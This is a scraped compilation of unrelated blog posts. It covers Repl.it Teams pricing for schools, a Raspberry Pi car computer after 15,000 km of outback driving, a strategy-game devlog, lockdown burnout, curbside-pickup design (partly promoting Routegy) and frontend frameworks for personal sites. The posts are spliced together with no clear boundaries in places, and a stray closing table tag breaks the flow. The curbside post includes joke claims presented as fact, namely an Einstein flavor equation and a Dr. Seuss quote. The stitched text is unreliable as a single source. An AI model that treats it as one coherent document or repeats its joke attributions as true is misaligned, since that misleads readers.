<p>When the pandemic hit and students around the world were forced to stay in and learn from home, we were saddened to hear that many students lost access to desktop computers. Luckily they had access to smartphones, and while mobile support wasn’t the best on Repl.it we worked really hard to improve it. It’s now so easy to code from your phone that you can code and spin up a website all from your phone’s web browser. </p>
<p><a href="https://blog.repl.it/mobile"><img src="https://blog.repl.it/images/mobile/preview.png" alt="mobile"></a></p>
<p>This is only the start. We’ll continue to invest in mobile coding because making programming more accessible is a core part of our mission. Upgrading to Teams will allow your students to code on the go, and, for those less fortunate who don’t have a computer at home, they will be able to continue learning uninterrupted.</p>
<h2 id="native-graphics">Native Graphics</h2>
<p>As coding moves to the cloud, we risk losing some of what makes programming special. As much as we like web programming, it’s not always the easiest to teach or learn. Graphics and game frameworks like <a href="https://repl.it/languages/pygame">PyGame</a> or <a href="https://repl.it/languages/love2d">LOVE2D</a> make making games a joy. That’s why Repl.it not only supports popular game frameworks but also anything that would want to render to native graphics drivers like Python’s <a href="https://docs.repl.it/repls/python-plots">matplotlib</a>.</p>

<p>Once you upgrade to Teams we bet it would be a lot of fun to build games with your students, teach them plotting, and overall engage in some of the most fun aspects of programming.</p>
<h2 id="team-profile">Team profile</h2>
<p>It's always cool to show off that you belong to one team or another, that's why you'll get to have a Team Profile complete with an avatar and "pinned" repls. </p>
<p><img src="https://blog.repl.it/images/teams_edu/profile.png" alt="qa"></p>
<p>Teachers and students under the team will also get a nice profile icon that shows affiliation with the team!</p>
<h2 id="github">GitHub</h2>
<p>GitHub being the world’s largest code repository hosting, we made it so that you can bring in any repo, configure it, and run it in under a minute without leaving your browser.</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/O2fZ_B6juNc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p> Not only does Repl.it integrates with Github very well, but we also partnered with the fine folks at GitHub education to make learning to code a breeze with Repl.it + GitHub Classroom. Read more <a href="https://github.blog/2020-05-26-code-in-the-browser-with-github-classroom/">about it here</a>.</p>
<p><img src="https://blog.repl.it/images/github-classroom/demo.gif" alt="GitHub Integration with Repl.it"></p>
<p>In addition to code-hosting, <a href="https://classroom.github.com/">GitHub Classroom</a> provides auto-grading functionality (similar to Repl.it Classroom) and makes it easy to manage your classroom and assignments.</p>

<p>So now that we’ve walked you through some of the benefits of Teams, let’s talk about what this means for the Classroom product. <strong>First, if you currently depend on the Classroom, don’t worry, we’d never take it away or deprecate before a) giving you ample time to move off, and b) making it easy to upgrade to Teams</strong>. We are, though, building Teams to be a superior experience and a superset of what Classroom currently provides.</p>
<p>If you’re new to Repl.it, or about to introduce it for the first time to your classroom then we suggest you start out with the Teams product, and where it’s lacking -- the biggest thing would be auto-grading and learning management -- supplement it with a combination of <a href="https://classroom.github.com/">GitHub Classroom</a>, or your own LMS like Google Classroom. </p>

<p>It’s our goal to get Repl.it into the hands of every code learner in the world. We really believe there’s not a better tool for teaching or learning to code. </p>
<p>First, if you currently depend on the Classroom, don’t worry, we’ll never take it away or deprecate it before a) giving you ample time to move off, and b) making it easy to upgrade to Teams. So if you're an existing Repl.it Classroom subscriber (free or paid), this doesn't change anything for you. Any new customers will have to subscribe to teams in order to get access to Classroom.</p>
<p>So that all said, in order to make it easy and so you don’t have to worry about how many students will be in your class from semester to semester, we’ve simplified our pricing for educational institutions with an affordable flat rate. And it's cheaper!</p>
<p><strong>Pricing tiers</strong></p>
<ul>
<li>Single-classroom teachers (up to 50 students): <strong>$20/month</strong></li>
<li>College professors (up to 250 students): <strong>$50/month</strong></li>
<li>Schools and departments (unlimited students): <strong>$100/month</strong></li>
</ul>
<p>And if you’re used to having to get annual budget approval or pausing your edtech subscriptions over the summer, we’ll give you two months off for an annual plan.</p>
<ul>
<li>50 students: <del>$240</del> <strong>$200/year</strong></li>
<li>250 students: <del>$600</del> <strong>$500/year</strong></li>
<li>Unlimited: <del>$1,200</del> <strong>$1,000/year</strong></li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<p>It’s been over a year since I first started building my car computer with the Raspberry Pi. In the time since, it’s traveled over 15000km through four Australian states. The majority of the distance has been on dirt roads and tracks, pushing the hardware to its limits.</p>
<p>As a whole the car computer has performed great, but after time on the road. There are some changes and fixes that I would make if I was starting again. Along with a rough road map for planned future functionality.</p>
<div id="attachment_1342"><p><img aria-describedby="caption-attachment-1342" src="https://www.development-cycle.com/wp-content/uploads/2017/04/mt_number_3.jpg" width="500" height="375" srcset="https://www.development-cycle.com/wp-content/uploads/2017/04/mt_number_3.jpg 500w, https://www.development-cycle.com/wp-content/uploads/2017/04/mt_number_3-300x225.jpg 300w" sizes="(max-width: 500px) 100vw, 500px"></p><p id="caption-attachment-1342">The Raspberry Pi Car Computer has suffered a lot of torment getting shaken violently on rough tracks around the country.</p></div>
<p><strong>A New Screen</strong></p>
<p>Before we even set off on the trip, I managed to damage the touchscreen! Eventually the computer is going to be mounted permanently in the center console of the car but for ease of patching,testing and development etc it has just been tied up to the grab bar on the passenger side.</p>
<p>Early one morning, when putting it back into the car I, didn’t realise the computer was in a bag that I handled a little roughly and some of the glass on the side of the touchscreen got broken off (pic).</p>
<p>Financial and time limitations before our departure date meant that the screen could not be replaced. In its defense, it still worked for the most part.</p>
<p>Overtime, the touch functionality started to stop working in the lower half of the screen though.<br>
<img src="https://www.development-cycle.com/wp-content/uploads/2017/04/broken_screen.jpg" width="500" height="357" srcset="https://www.development-cycle.com/wp-content/uploads/2017/04/broken_screen.jpg 500w, https://www.development-cycle.com/wp-content/uploads/2017/04/broken_screen-300x214.jpg 300w" sizes="(max-width: 500px) 100vw, 500px"><br>
The plan was to live with it and replace the screen when I finally mounted it in the car for good. But, as more time passed, the slightest vibration would have the cursor randomly moving around clicking things.</p>
<p>The random playing, stopping and starting of songs was starting to get to me! The system was becoming unusable so I paid the money and got a brand new Raspberry Pi touchscreen delivered.<br>
<img src="https://www.development-cycle.com/wp-content/uploads/2017/04/new_screen.jpg" width="500" height="375" srcset="https://www.development-cycle.com/wp-content/uploads/2017/04/new_screen.jpg 500w, https://www.development-cycle.com/wp-content/uploads/2017/04/new_screen-300x225.jpg 300w" sizes="(max-width: 500px) 100vw, 500px"><br>
The original display was purchased a few days after release, so it had the v1.0 display controller. The new unit has a v1.1 controller board, so the backlight brightness can be controlled from the Raspberry Pi.</p>
<p>Even using “night mode” having the display backlight at full power causes a lot of glare in the cabin at night. So functionality to control the screen brightness will be added to the Car Computer settings pages as soon as possible.</p>
<p><strong>Power Connections</strong></p>
<p>The power coming into the computer travels from a connector to a voltage converter, which then provides power to the USB hub and the Pi. The wire connections are a source of pain, dirt roads in the outback are commonly heavily corrugated from water. Driving across them literally shakes your car apart. Terminal connectors holding the wiring together need periodic tightening, otherwise the car computer randomly turns off and on as the wires gets shaken around.</p>
<p>It’s not going to be an issue for a car that never leaves tar roads. But if any off road travel is planned, crimp or soldering the wires together as best as you can or the vibration will play havoc with the system.</p>
<p><strong>Hard Drive </strong></p>
<p>Setting out, I thought car vibration may cause issues with a normal 3.5 inch notebook hard drive. But due to the cost of larger solid state hard drives I decided to risk it anyhow.</p>
<p>So I am glad to say, the hard drive has up till this point, no issues whatsoever. If money was no object, I would choose an SSD, given the lower power consumption. But the notebook drive has performed well enough and given the 1TB storage size offers, a huge amount of storage for little cost.</p>
<p><strong>Connectivity</strong></p>
<p>Originally a Huawei K3715 3G Dongle was used for Internet connectivity on the road. But in the days of 4G mobile networks it was slow, reception was never great and seemed to also draw a lot of power.</p>
<p>So I purchased a <a href="https://www.development-cycle.com/2017/04/zte-mf832-inside/">Telstra Branded ZTE MF823 4G LTE dongle</a> for $39 from an Australia Post outlet. It has sockets for two external antennas allowing me to use an Axis CLR8 7-9db external 4G antenna mounted on the bull bar for improved network reception.</p>
<p><img src="https://www.development-cycle.com/wp-content/uploads/2017/04/4g_aerial.jpg" alt="" width="500" height="375" srcset="https://www.development-cycle.com/wp-content/uploads/2017/04/4g_aerial.jpg 500w, https://www.development-cycle.com/wp-content/uploads/2017/04/4g_aerial-300x225.jpg 300w" sizes="(max-width: 500px) 100vw, 500px"></p>
<p>Another added benefit from the upgrade was system simplification. Originally I was using the sakis3g script to control the mobile network connection. The <a href="https://www.development-cycle.com/2017/04/zte-mf823-inside/">ZTE MF823 has a different architecture though</a>, rather than being a standard mobile dongle. It also houses a small embedded Linux system that appears on the host system as a standard ethernet adapter. The embedded system manages the connection so the sakis3g script is no longer needed.</p>
<p><strong>UI Design</strong></p>
<p>The layout of a user interface hugely important to the usability application but for the most part it’s not something that most of us think that much about. Most of the changes to the system while on the road have been changes to the layout of the application to try and minimise the amount of input required from the user.</p>
<p>A perfect example is <a href="https://github.com/anthony-mills/raspberrypi-carputer/commit/87002930938cabfa8a60f673bb1c1535360d8d69">commit 8700293</a>, automatically starting the playback of a play list when loaded, if music is not already playing. Before this change, a user would have to select the play list they wanted, navigate back to the homepage and then select the “Play Queue” option from the main menu. It’s only two more taps, which may not seem like a great deal but when off road the car is jumping around on an unstable and unpredictable surface, so aiming and landing a tap in the right area of the screen can be an extremely frustrating pain in the arse.</p>
<p>So the new approach to the code base is going to be ‘interaction minimisation’. Anything music related that can be handled with less input from the user, is going to simplified as far as it can. Most of the time in the car you just want some music; it’s not something I want to get frustrated at, because I cannot get something working while bouncing around.</p>
<p><strong>Future Direction</strong></p>
<ul>
<li>The trip meter and trip mapping functions still suck. This functionality in theory should be easy:&nbsp; collect some data points, calculate the distance between then and plot the data on to a map. In the real world, it’s not so cut and dry though. Extensive road testing has at least given me more trip data and I am to use this to sort out the bugs that seem to keep popping up in this part of the application.</li>
<li>Backlight brightness control: as mentioned earlier in the post, the official 7inch Raspberry Pi touchscreen v1.1 and above allows the user to control the display brightness. This will be controllable from the settings screen and will help reduce glare in the cab at night.</li>
<li>A down loadable image file, building the system from scratch is all well and good but its time consuming. Over the next couple of months, I am going to try to create a small (few gigabytes tops) image file that can be written on to a SD Card, and the put into a Raspberry Pi to get a user up and running as quickly as possible.</li>
<li>Longer term, the application has been built using Ionic Framework 1.x which has now been deprecated. So I need to investigate the work required to bring the application up to date with the latest releases.</li>

<p><span><em>This is an ongoing development series about&nbsp;<a href="https://www.bobbybobbybobby.com/pages/chaotic-era">CHAOTIC ERA</a>, an interstellar strategy game. <strong><a href="https://www.bobbybobbybobby.com/pages/subscribe">Join the beta waitlist here</a></strong> or&nbsp;<a href="https://twitter.com/chaotic_era" aria-describedby="a11y-external-message"><strong>follow us on Twitter</strong></a>&nbsp;for the latest updates.</em></span></p>
<p><span>It’s often said that the meaning of a piece of art comes after it’s been made—the audience assigns their own ideas and emotions to it; they see trends and patterns that not even the original artist was aware of.&nbsp;</span></p>
<p><span>Just as in painting or sculpture or songwriting, the same principles apply to the art form of game design. Whatever a developer has in their head when they’re creating a game is only half the equation. The art direction, the gameplay, the end goal they have in mind… while these are important factors, ultimately there will also be inspiration beneath the surface, deep within their subconscious, that find their way into a game whether they’re aware of it or not.</span></p>
<p><span>This has definitely been the case for <a href="https://www.bobbybobbybobby.com/pages/chaotic-era">Chaotic Era</a>.</span></p>
<p><span>When we first started work on the game years ago, we had a vague notion of what the final product should look like. We wanted to build a strategy game on an epic scale; one that would take place across an entire universe.</span></p>
<p><span>We wanted to capture the mystique and vastness and excitement of games like No Man’s Sky and Elite Dangerous while working in ideas from our favourite sci-fi classics.</span></p>
<p><span>And in our first phase of development, where we mostly focused on navigation UI and worldbuilding, those influences couldn’t be more clear.</span></p>
<p><span>Our minimal FUI design combined our love for the retrofuture of Blade Runner and Alien, with the modern interfaces of fighter jets and helicopters. The AI-worshipping interstellar universe dominated by shadowy corporations drew from a wide range of sources like 2001: A Space Odyssey, Battletech, and Dune.</span></p>
<p><span><img alt="" src="https://cdn.shopify.com/s/files/1/0110/1938/6902/files/spinners-ENVIRON-CTR_1024x1024.gif?v=1593361746"></span></p>
<p><span><em>Image via <a href="https://scifiinterfaces.com/">www.scifiinterfaces.com</a></em><br></span></p>
<p><span>But once we started getting into the nuts and bolts of the game—the actual gameplay and game rules—we started making our way down a rabbit hole with little idea of where we might end up.</span></p>
<p><span>Each exploration started to take on a life of its own as we began adding components that felt like they made sense.</span></p>
<p><span>How would you build new ships? Well, I guess we need worker units. Where do worker units come from? Well, I guess we need building units that house workers. And those workers require population and energy to produce. And energy comes from reservoirs you discover, and harvest with those same workers.</span></p>
<p><span>And so on it went, until we came to our current point in time: with a fleshed out game experience whose influences surprised us.</span></p>
<p><span>Once we were able to look back on what we built, we quickly began to retrospectively see patterns that we weren’t even aware of.</span></p>
<p><span>Our isometric grid, world planning, and disasters? We realized those were pulled out of ninth grade memories spent beating Sim City 2000 in computer labs.&nbsp;</span></p>
<p><span>Worker units created by factories, sent to harvest resources, and used to construct new buildings? Hours sank into Starcraft were surfacing in unexpected ways.</span></p>
<p><span>Without even realizing, but thankfully so, we were building a strategy game that was subconsciously heavily influenced by some of our favourite RTS trailblazers: Sim City 2000, Starcraft, Command &amp; Conquer, and so on.</span></p>
<p><span><img alt="" src="https://cdn.shopify.com/s/files/1/0110/1938/6902/files/71104_screenhi_930x524_en_US_01___2014-04-01-11-01-16_088f82de4701f05aa0a16904261a1f3be30ae43b_grande.jpg?v=1593361854"></span></p>
<p><span>Each planet in Chaotic Era is like its own Sim City or Starcraft match; the main difference being here that as you expand your empire, you’ll find yourself balancing many matches at once. And those matches will suddenly have complex interdependencies and domino effects based on the decisions you make, or don’t make.&nbsp;</span></p>
<p><span>The interesting thing is that I feel like if we had intentionally set out to create a game that emulates these classics of the genre, then we would’ve ended up with an end product much flatter and less exciting.&nbsp;</span></p>
<p><span>By chasing a notion of what we wanted to build—looking at the world and feelings we were trying to evoke—we let our minds pull together these influences without even realizing, ultimately creating something that we’re incredibly proud of (and constantly surprised by). We weren’t forcing building blocks together, instead we were chipping away at marble and uncovering the hidden forms underneath the surface.</span></p>
<p><span>Now, it’s been a while since our last progress update, so I wanted to cover a few things along the lines of how early real time strategy games have been driving our recent game design.</span></p>
<h2><b>Changes in visual direction for planets</b></h2>
<p><span>At lower levels of elevation, the camera aligns to an isometric, 45º point of view, allowing the player to see a different level of detail than when zoomed out. As well, a subtle "ground" texture has been added to suggest terrain, populated by perlin noise.</span></p>

</table>
<p><span>A dust effect was explored as well, inspired by the ground conditions of a comet captured by a European probe:</span></p>
<p><span><img src="https://camo.githubusercontent.com/b026c4244e490af668e696bf39a125d5dc5e2120/68747470733a2f2f63646e2e6d6f732e636d732e66757475726563646e2e6e65742f765668414d536d38774d715a345a4c716978767368432d313032342d38302e676966" alt=""></span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/80933480-e9c50900-8d91-11ea-8157-2b1f59fa1251.gif" alt=""></span></p>
<p><span>Outline shaders were explored but ultimately dropped due to difficulty required to achieve a certain level of quality, but also additional visual noise that would be introduced. The shader will be re-examined when there's an opportunity to display models in higher levels of detail (ie. a "unit details" view)</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/80932750-e3815d80-8d8e-11ea-9e25-8029bd3a9bf2.gif" alt=""></span></p>
<h2><b>Garage tiles</b></h2>
<p><span>Introduces a finite grid to the garage which consists of tiles that are owned by the player, not owned but purchasable, not purchasable and not owned, and unknown. The majority of the "board" consists of unknown tiles, acting as a fog of war mechanic. Tiles that are unowned but purchasable are represented by a single dot and when tapped, are purchased for a fixed price immediately.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/80932925-8cc85380-8d8f-11ea-8c33-5c44c285691c.gif" alt=""></span></p>
<p><span>The previous set of rules dictating validity of a unit's position have been adjusted too, now discriminating against a few more rules than before, such as whether or not a tile is unowned, non-purchasable, or of an unknown state.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/80933612-7ff92f00-8d92-11ea-8525-028ca760aeb7.gif" alt=""></span></p>
<h2><b>Workers</b></h2>
<p><span>A new Unit class and mechanic has been introduced, </span><span>TileUnit</span><span> and </span><span>Tile</span><span> respectively. </span><span>TileUnits</span><span> can be purchased in the same way </span><span>ShipUnits</span><span> can be purchased, and placed in the garage in the same way too. The only difference is </span><span>TileUnits</span><span> can produce </span><span>Workers</span><span> which are required for performing various functions, starting with terraforming the surface of a single body so additional units can be placed. This is all in the vein of making energy and population generation/consumption more transparent, where there will eventually be a unit for generating energy and population, and population will be literally countable by the number of worker units in a single garage.</span></p>
<p><span>This work began with exploring how to subdivide a 2D cell into n subdivisions, and creating connected pathways across the lengths of the cell for workers to travel across.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/83935377-11d7cb80-a787-11ea-8830-a29d29d24d51.gif" alt=""></span></p>
<p><span>The step after this was investigating how to fill available space around the paths with as large shapes as possible in order to fill them with decorative elements such as tents and satellites.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/83935379-18fed980-a787-11ea-9da6-7db9d2276ff8.gif" alt=""></span></p>
<p><span>From here, it was a matter of figuring out a way to place assets in these available spaces.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/83935407-55323a00-a787-11ea-8a1e-f210ca71be6f.gif" alt=""></span></p>
<p><span>Work was then done to ensure entrances were calculated by neighbouring entrances to ensure seamlessness of interlocking tiles.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/83935428-8448ab80-a787-11ea-8215-a56dcb77b5d7.gif" alt=""></span></p>
<p><span>The final result was actually inserting worker units and their assets and having them follow these paths towards assigned targets.</span></p>
<p><span><img src="https://user-images.githubusercontent.com/983669/83935451-b0642c80-a787-11ea-9d9c-3a2618e3fb11.gif" alt=""></span></p>
<p><span>This involved a new Job-Worker design which now gets encoded to save files. The user creates jobs by performing an action like clicking an available cell, and a new </span><span>Foreman</span><span> class takes inventory of "idle" workers, dynamically assigning workers closest to the job location, or reassigning assigned workers by pulling them off a job they are already stationed at.</span></p>
<p><span>This design will need to continue evolving over the next few months to fill in functionality gaps, such as the ability to move and perform work while the game is closed. This and many more aspects will be refined as unknowns are uncovered.</span></p>

	<p><i>June 30th 2020</i></p>

	<p>How have you spent your time in lockdown? Well, if you're anything like me, you've been drowning yourself in work and side projects to get through the long lockdown months. It's been glorious, I work in the morning, then geek out on side projects all afternoon. I'm at peak productivity, and have completed so many <a href="https://tinyprojects.dev/projects" target="_blank">projects</a> whilst the world has been falling apart.</p>

	<p>Last week though, things started to go very wrong.</p>

	<p>Monday rolled around, and I was excited for a new week of building things. However, by the end of the day, I'd managed to tick only half of the items off my to-do list. The next day my productivity plummeted even more. My focus had gone, and my work output was tiny.</p>
	
	<p>So, on Wednesday, after a work call in the morning, I headed off to the beach for a relaxing day off. I knew I'd come back feeling refreshed and super productive the day after.</p>

	<p>It didn't work though, Thursday was even worse. I sat at my laptop all day and probably achieved 1 hour of useful output. Worse, I was beating myself up because my day off had done nothing.</p>

	<p>I had reached what I now call <b>lockdown burnout</b>. Maybe you've experienced this too. After 3 months of creating, building and coding during lockdown, something inside me had broken. I felt absolutely fine, I wanted to build, but I simply could work no more.</p>

	<p>A single day off was not going to fix lockdown burnout. Instead, I took 3 days of pure rest: BBQ's, video games, reading, and even some camping. Not a single line of code was written.</p>

	<p>Monday once again arrived, but this time things were different: I ended up having one of the most productive days of my life. One hour of work probably had the same productive output as 5 hours of "work" before my lockdown burnout. I'd gained superpowers.</p>

	<p>Lockdown is a creator's dream. Its the ultimate excuse to stay indoors and build things all day. On the flip side, it can be really hard to know when to stop building when there's no end in sight. Programmers are hardwired to build and problem solve. We literally keep going at something until its done, even when you're not actually "doing" much.</p>

	<p>Taking a break to get more done can seem so counterintuitive, but it really works. I'm not talking about the odd day off, but several long, uninterrupted days of deep rest to fully recharge.</p>

	<p>If you've forgotten to stop the past few months, take a break.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="https://blog.routegy.com/images/posts/curbside-experience/lawn-chair-curbside-sign.png"></p><p>As states have introduced restrictions in response to the <a href="https://www.who.int/health-topics/coronavirus" target="_blank" rel="noopener noreferrer">COVID-19 pandemic</a>, most restaurant and retail organizations have worked quickly to shift operations to phone/online ordering and curbside pickup. While curbside pickup has reduced the number of in-person interactions required, each companys' implementation and success has been wildly different. Restaurants built on years of takeout/delivery experience are thriving while some sit-down restaurants and retail stores are struggling to adapt.</p> <p>Let's talk, with a smattering of snark and candor, about some of the curbside pickup experiences I've seen in the wild, where they fall short, and how they can be better.</p> <h2 id="what-do-customers-want"><a href="#what-do-customers-want">#</a> What do customers want?</h2> <p>I want to arrive, let you know I'm here, and get my order. That's it. No muss, no fuss.</p> <p>This is surprisingly difficult to find. Let's dive into some of the major pain points.</p> <h3 id="don-t-force-me-to-go-inside-your-establishment"><a href="#don-t-force-me-to-go-inside-your-establishment">#</a> Don't force me to go inside your establishment</h3> <p>We aren't all wearing holsters strapped with lysol cans looking for germs to spray. If you aren't enforcing <a href="https://www.cdc.gov/coronavirus/2019-ncov/prevent-getting-sick/social-distancing.html" target="_blank" rel="noopener noreferrer">social distancing guidelines</a> and promoting customer/employee safety in public, I don't have high confidence you're doing so behind closed doors.</p> <blockquote><p>Customers are unlikely to return if they feel required to sanitize all goods purchased from your business.</p></blockquote> <p>We know your top priority is keeping your staff healthy and your building clean so it can stay open. In addition to the impact on sick employees and their families, you're facing a quarantine, deep cleaning, and sanitization. This is a huge expenditure and loss of revenue that lasts beyond reopening day. No one is champing at the bit to patronize a business immediately after a reported COVID-19 outbreak.</p> <p>Even if your state is re-opening, <a href="https://www.cdc.gov/coronavirus/2019-ncov/cases-updates/cases-in-us.html" target="_blank" rel="noopener noreferrer">reported cases</a> continue to rise. This isn't going away anytime soon.</p> <p>Limit exposure to limit business risk.</p> <p><strong>Instead</strong> of forcing me to go inside, make me wait outside of the building, in my car, or outdoors. I don't need to be breathing on you or another customer's food.</p> <h3 id="don-t-make-me-install-an-app"><a href="#don-t-make-me-install-an-app">#</a> Don't make me install an app</h3> <p>I know, I know. You've got an app. You want to send me push notifications with the latest deals. Bump those engagement metrics, I get it.</p> <blockquote><p>Not all customers want to be part of your loyalty program.</p></blockquote> <p><img src="https://blog.routegy.com/images/posts/curbside-experience/office-depot-curbside-sign.png" width="55%"></p><p>The app might be a worthwhile experience once I have it, but think about how this plays out for those who don't. We’re expecting a quick interaction and pickup and this isn’t it.</p> <p>I pull into the parking lot to pick up my order of Sriracha, Lucky Charms, and toilet paper. Before I can get my order I have to wait to download your app, accept permissions, and sign up for an account. Do I already have an account? What is my password? I have to do all of this just to let you know that I’m here to pick up my order. Too many hoops that take too long.</p> <p>What is the market penetration for your app amongst your customer base? What percentage of those customers without the app will purchase for curbside pickup? These are all of the customers that are negatively impacted by this process.</p> <blockquote><p>"I should receive my order and leave in less time than it takes me to download your app."</p></blockquote>  <p>Consumer of goods and services</p> <p><strong>Instead</strong> of an app, why not a website? I don't have to download it and it's accessible by every smartphone on the planet. Make it available via a <a href="https://en.wikipedia.org/wiki/QR_code" target="_blank" rel="noopener noreferrer">QR code</a>, <a href="https://en.wikipedia.org/wiki/Near-field_communication" target="_blank" rel="noopener noreferrer">NFC tag</a>, or <a href="https://en.wikipedia.org/wiki/URL_shortening" target="_blank" rel="noopener noreferrer">short url</a>. Heck, include it in my receipt. Viewing a website and providing my information is infinitely (math checks out) faster than installing an app.</p> <h3 id="do-not-make-me-wait-on-hold"><a href="#do-not-make-me-wait-on-hold">#</a> Do not make me wait on hold</h3> <p>You only have one phone line that you're using for curbside pickup calls and taking new orders. Not great.</p> <p>Einstein wrote a paper in 1905 positing that <code>flavor = time * salt / moisture ^ 2</code>. Once it enters that clamshell, takeout food has a shelf life of around four seconds. The longer I have to wait to notify you that I'm waiting decreases the quality of the food exponentially. Soggy burger buns make me question returning to your restaurant and humanity in general.</p> <p><img src="https://blog.routegy.com/images/posts/curbside-experience/red-robin-curbside-sign.png" width="30%"></p><blockquote><p>Help me help you.</p></blockquote> <p>Don't make me block your phone line from taking new orders while I tell you that I'm in parking spot #4 driving a Pontiac Fiero and would like extra ketchup. How many potential customers call back a restaurant to make an order if the line is busy? How many potential food orders are <em>you</em> losing?</p> <p><strong>Instead</strong> of waiting on hold, I'd rather do <strong>anything</strong> else. Do you have a business line with multiple numbers? Use a different one to separate orders and pickups. Use different phone extensions. Use anything other than the phone for pickups if it's going to be in contention!</p> <h3 id="don-t-ask-for-redundant-information"><a href="#don-t-ask-for-redundant-information">#</a> Don't ask for redundant information</h3> <p>Why do you need my name <em>and</em> order ID? Why aren't your order IDs unique? A description of my car? I just gave you the reserved pickup parking spot number I'm in.</p> <p>I'm wearing a hat. Does that help?</p> <p><img src="https://blog.routegy.com/images/posts/curbside-experience/restaurant-touch-app.png" width="35%"></p><p>I made a curbside pickup at a big box electronics company recently. I filled out the required online check in form upon arrival. A worker came to my car, asked me if I had filled out the form and then proceeded to ask me for the <em>same exact information</em> that I had already provided.</p> <blockquote><p>Don't ask for three pieces of information when one will suffice and sure as heck don’t ask twice!</p></blockquote> <p>Dr. Seuss</p> <p>Ambassador of curbside pickup, Whoville.</p> <p><strong>Instead</strong> of asking for more, change your workflow to ask for less. To complete a curbside pickup, you only need information for the following:</p> <ul><li>Uniquely identify an order</li> <li>Identify my current physical location</li></ul> <p>Leverage technology for this.</p> <p>Provide customers unique order identifiers in their email receipts that can be easily referenced. Identify your reserved curbside pickup spaces with separate phone extensions or unique QR codes. Customers notifying you that they are waiting will automatically have location context provided. Are they in parking spot #3? Are they at the side door? That's another piece of information you don't have to ask for and they don't have to think about.</p>  <p>With all that said, I am biased. I have a <s>dog</s> soggy bun in this fight. I built <a href="https://routegy.com/" target="_blank" rel="noopener noreferrer">Routegy</a> to create wonderful customer experiences within physical spaces and since the COVID-19 pandemic, people have started leveraging it to improve their own curbside pickup experiences.</p> <p><img src="https://blog.routegy.com/images/posts/curbside-experience/orenji-curbside-sign.png" width="50%"></p><p>With <a href="https://routegy.com/" target="_blank" rel="noopener noreferrer">Routegy</a>, you can create signage outside of your establishment with <a href="https://en.wikipedia.org/wiki/QR_code" target="_blank" rel="noopener noreferrer">QR codes</a> and/or <a href="https://en.wikipedia.org/wiki/Near-field_communication" target="_blank" rel="noopener noreferrer">NFC tags</a> that customers can interact with directly from their phones. Customers are asked for <strong>only</strong> the information you need to identify their order and Routegy will gather the rest. That's it. <strong>No app required!</strong></p> <p>With Routegy’s integrations, employees inside are instantly notified when customers arrive and have relevant order information at their fingertips. Once an order is delivered to the customer, it can simply be marked as done.</p> <p><img src="https://blog.routegy.com/images/posts/curbside-experience/trello-curbside-waitlist.png"></p><h3 id="want-to-learn-more"><a href="#want-to-learn-more">#</a> Want to learn more?</h3> <p>Routegy is helping a number of local businesses in the Washington area with contactless curbside pickup. Take a look at <a href="https://blog.routegy.com/2020/06/18/orenji-streamline-curbside-pickup-routegy/">our case study for Orenji Sushi &amp; Noodles</a>, our <a href="https://docs.routegy.com/tutorial/streamline-curbside.html" target="_blank" rel="noopener noreferrer">contactless curbside pickup tutorial</a>, or contact us at <a href="mailto:connect@routegy.com">connect@routegy.com</a>.</p> <h3 id="don-t-want-to-use-routegy"><a href="#don-t-want-to-use-routegy">#</a> Don't want to use Routegy?</h3> <p>Hey, that's fine too. I hope after reading this that you've discovered some ways to improve your own curbside experience to build loyal customers and fans.</p> <p>Using different tools/technology? Looking for an integration with your PoS system? Want to discuss problems you're experiencing with curbside pickup? I'd love to hear about them in our <a href="https://community.routegy.com/t/an-examination-of-the-curbside-pickup-experience/19" target="_blank" rel="noopener noreferrer">comments section</a> for this post.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="frontend-stack">Frontend Stack</h2>
<p>Until somewhat recently, I think that hosting was probably a more important concern for creating a personal site than the frontend stack. But with options like <a href="https://pages.github.com/">Github Pages</a>, <a href="https://www.netlify.com/">Netlify</a>, and <a href="https://vercel.com/">Vercel</a>, the hosting part of the equation has become a whole lot easier. Nowadays a personal site is all about what you build it with. I think it's fair to say most people looking to build a personal site are, in equal parts, wanting to get a professional foothold on the web and also just have fun building something new. And when building something new, there is a whole lot of new out there. So much so, that many people cannot even bring themselves to begin because they're afraid of picking the wrong stack.</p>
<h3 id="picking-a-framework">Picking A Framework</h3>
<p>A good question to ask yourself when picking a framework is which of the two following focuses is most important to you.</p>
<h4 id="1-javascript">1) Javascript</h4>
<p>Javascript, the necessary evil turned eternal turf war, is probably at top of mind for most people looking to build a personal site in order to "play with new tech". This is also a great splitter of options if you do know what javascript framework you want to work in. If you still cannot decide on a framework, then you probably have more this vs that javascript framework articles to read.</p>
<h5 id="react">React</h5>
<p>If you must work with <a href="https://reactjs.org/">React</a>, <a href="https://www.gatsbyjs.org/">Gatsbyjs</a> and <a href="https://nextjs.org/">Nextjs</a> are very popular and capable options. Gatsbyjs takes a more holistic approach between the frontend and the backend whereas Nextjs is mostly concerned with creating a static and ssr environment for React apps.</p>
<h5 id="vuejs">VueJs</h5>
<p>If you must work with Vuejs (my personal favorite), <a href="https://nuxtjs.org/">Nuxtjs</a> (what <a href="https://formcake.com/">formcake.com</a> is build on), <a href="https://gridsome.org/">Gridsome</a>, and <a href="https://vuepress.vuejs.org/">VuePress</a> are all great options. As is often the case in the world of Vue, it is often easiest to compare Vue based project's with their React equivalents. Gridsome is like Gatsbyjs and Nuxtjs is like Nextjs. VuePress is much more targeted to those who want to create a site for blogging.</p>
<h5 id="angular">Angular</h5>
<p>I cannot really imagine someone making a personal site in Angular unless they really want to force themselves to learn Angular for a job of some kind but there is an interesting <a href="https://angular.io/">Angular</a> static site generator project called <a href="https://github.com/scullyio/scully">Scully</a> that I have been meaning to try. If anyone reading this has played with Scully, send me your thoughts to <a href="mailto:david@formcake.com">david@formcake.com</a>.</p>
